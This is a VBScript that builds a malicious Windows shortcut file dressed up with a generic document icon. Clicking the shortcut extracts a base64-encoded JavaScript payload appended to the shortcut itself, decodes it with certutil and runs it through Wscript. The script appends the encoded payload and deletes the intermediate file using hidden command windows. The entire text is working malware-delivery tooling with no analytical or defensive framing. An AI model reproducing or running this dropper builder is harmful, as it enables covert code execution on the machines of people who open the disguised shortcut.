Set WshShell = Wscript.CreateObject("Wscript.Shell") 

pt="." 
lnkName= pt&"\untitle.lnk"

exe_path = "%windir%\System32\cmd.exe" 
exe_args = "/c start echo %cd% pause"

exe_args = "/c copy untitle-ok.lnk %temp%\untitle.lnk /y& " & _
 "C:\Windows\System32\cmd.exe /c for /r %temp% %j in (*untitle-ok*.lnk) do copy %j %temp%\untitle.lnk /y& " & _ 
 "findstr.exe /b ""dmFyIHNoZWxsI"" %temp%\untitle.lnk >%temp%\untitleb64.tmp & " & _
 "certutil.exe -decode %temp%\untitleb64.tmp %temp%\untitleb64.js & " & _
 "Wscript %tmp%\untitleb64.js &pause&exit"
 
icon_str = "C:\Windows\system32\SHELL32.dll,1"

Set MyLink = WshShell.CreateShortcut(lnkName) 
MyLink.TargetPath = exe_path
MyLink.Arguments  =  exe_args
MyLink.IconLocation = icon_str
MyLink.Save 

isHidden=0
WshShell.Run "cmd.exe /c copy /B untitle.lnk + m-run.js64.txt /B untitle-ok.lnk",isHidden,true
WshShell.Run "cmd.exe /c del  /F untitle.lnk",isHidden,true
